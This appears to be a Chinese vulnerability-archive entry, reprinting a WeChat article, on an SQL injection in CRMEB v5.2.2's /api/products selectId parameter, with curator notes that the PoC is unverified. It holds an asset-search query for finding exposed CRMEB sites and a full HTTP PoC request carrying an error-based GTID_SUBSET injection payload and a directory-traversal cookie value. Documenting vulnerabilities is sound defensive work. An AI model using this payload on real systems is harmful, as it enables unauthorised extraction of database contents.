---
source: "gelusus/wxvl 公众号漏洞文库"
title: "CRMEB products selectId SQL 注入"
product: "CRMEB"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "5.2.2声明/5.3.0修复声明；MySQL GTID_SUBSET"
prerequisites: "会话Cookie及think_var路径载荷"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/CRMEB/CRMEB%E5%BC%80%E6%BA%90%E7%94%B5%E5%95%86%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20%E9%99%84POC.md"
id: "vw-f9d93ddffe519c084b53444e"
entity_id: "ve-f9d93ddffe519c084b53444e"
schema_version: "1"
---

# CRMEB products selectId SQL 注入

## 条目说明

- 对象与具体问题：CRMEB；products selectId SQLi
- 版本、配置及部署条件：5.2.2声明/5.3.0修复声明；MySQL GTID_SUBSET
- 认证与权限前提：会话Cookie及think_var路径载荷
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- Cookie think_var含目录穿越属于另一机制残留，需说明是否必要，避免混合验证
- selectId报错SQLi仅图无根因/文本响应，不推出服务器控制
- 版本修复无官方链接；去简介碎行和营销

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

原创 安服仔
                    安服仔  北风漏洞复现文库   2026-01-30 01:36  
  
## 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
##   
##   
  
01  
  
—  
  
漏洞名称  
  
CRMEB开源电商系统SQL注入漏洞  
  
02  
  
—  
  
影响版本  
  
CRMEB v5.2.2版本  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJyLoQ2TobeEXuUIwfOCfaR3n6kVFiciamgIlBrLAX8nibusqdPqazRVbyOnZY7RibrZfJia4lHdmH94LA/640?wx_fmt=png&from=appmsg "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhLTxND8mIPwiaca3HjpxsgMOHJiaPmELuHYPfCHgM308zZYsdRqhJOMrG4SCgMxibX5h14xETWictrwTg/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=0 "")  
  
03  
  
—  
  
漏洞简介  
  
CRMEB是一款基于ThinkPHP框架开发的开源电商系统，专为中小企业和个人商家设计，提供完整的B2C电商解决方案。系统采用前后端分离架构，支持多端适配，集成了商品管理、订单处理、会员体系、营销工具、支付对接、数据统计等核心功能，并内置  
多商  
户  
SA  
AS模式扩展能  
力。其代码开源免费，遵循Apache2.0协议，注重高性能与安全性  
，  
支持  
二次开发，配套丰富的API接口和详细文档，帮助用户快速搭建个性化电商平台，降低运营成本  
。  
攻击者可通过构造恶意请求，利用该漏洞获取数据库中的敏感信息，如用户数据、订单信息等，甚至  
可能进一步获取服务器控制权限。  
  
  
04  
  
—  
  
资产测绘  
```
body="/wap/first/zsff/iconfont/iconfont.css" || body="CRMEB"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJyLoQ2TobeEXuUIwfOCfaR9q0F5MZLKbx4ibZK2nf0eus7V3JjjgibrB9APnFJiay7iaibQgDz0H1iaficA/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```http
GET /api/products?limit=20&priceOrder=&salesOrder=&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(3550=3550,version()))),0x7e),3550) HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: think_var=..%2F..%2Fapplication%2Fdatabase; PHPSESSID=m0lgoj6m4hovmtisu1868cc8h5
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJyLoQ2TobeEXuUIwfOCfaR1h3gUmblAyiaaGJGEic6KQtU8LbxQgy0qZ9XUZLDEMcaibUibz1NQtiaRSw/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
  
升级至CRMEB v5.3.0及以上版本  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
